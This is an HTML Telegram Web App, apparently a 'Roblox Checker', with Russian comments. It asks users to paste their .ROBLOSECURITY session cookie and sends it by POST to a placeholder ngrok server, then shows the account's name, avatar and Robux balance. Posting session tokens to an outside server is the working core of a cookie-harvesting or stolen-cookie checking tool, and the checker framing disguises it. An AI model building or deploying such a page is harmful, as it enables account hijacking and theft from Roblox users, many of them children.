<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; padding: 20px; }
        input { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        button { background: #0088cc; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
        #result { margin-top: 20px; display: none; background: #2a2a2a; padding: 15px; border-radius: 10px; }
        .avatar { width: 150px; border-radius: 10px; margin-bottom: 10px; }
        .robux-icon { color: #f7b500; font-weight: bold; }
    </style>
</head>
<body>
    <h3>Roblox Checker</h3>
    <input type="text" id="cookieInput" placeholder="Вставь .ROBLOSECURITY">
    <br>
    <button onclick="checkAccount()">Проверить внутри Web App</button>

    <div id="result">
        <img id="avatar" class="avatar" src="">
        <h2 id="name"></h2>
        <p>Баланс: <span id="robux" class="robux-icon"></span> R$</p>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        async function checkAccount() {
            const cookie = document.getElementById('cookieInput').value;
            const resDiv = document.getElementById('result');
            
            // ВАЖНО: Замени URL на адрес, где запущен твой Python сервер (например, через ngrok)
            const SERVER_URL = "https://твой-адрес.ngrok-free.app/check_roblox";

            try {
                const response = await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ cookie: cookie })
                });
                
                const data = await response.json();

                if (data.status === "success") {
                    document.getElementById('avatar').src = data.image;
                    document.getElementById('name').innerText = data.username;
                    document.getElementById('robux').innerText = data.robux;
                    resDiv.style.display = "block";
                    
                    // Опционально: отправить отчет боту, что проверка прошла
                    tg.sendData("Проверка аккаунта " + data.username + " завершена успешно!");
                } else {
                    alert("Ошибка: Неверные куки");
                }
            } catch (e) {
                alert("Ошибка соединения с сервером");
            }
        }
    </script>
</body>
</html>
